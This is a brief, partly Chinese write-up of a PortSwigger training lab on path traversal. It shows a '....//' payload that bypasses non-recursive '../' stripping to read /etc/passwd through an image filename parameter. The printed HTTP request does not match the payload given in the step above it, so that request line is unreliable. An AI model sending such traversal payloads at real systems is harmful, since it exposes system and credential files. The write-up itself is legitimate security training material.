# File path traversal, traversal sequences stripped non-recursively

## Information
---

- [PortSwigger - Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

This lab contains a file path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 

## Solution
---

- 過濾機制: 此網頁會將參數中 **../** 字串過濾掉。

1. 將 **filename** 更改為 **....//....//....//....//etc/passwd**，繞過過濾機制。
    ```
    GET /image?filename=....//...//...//...//...//etc/passwd HTTP/1.1
    ...
    ```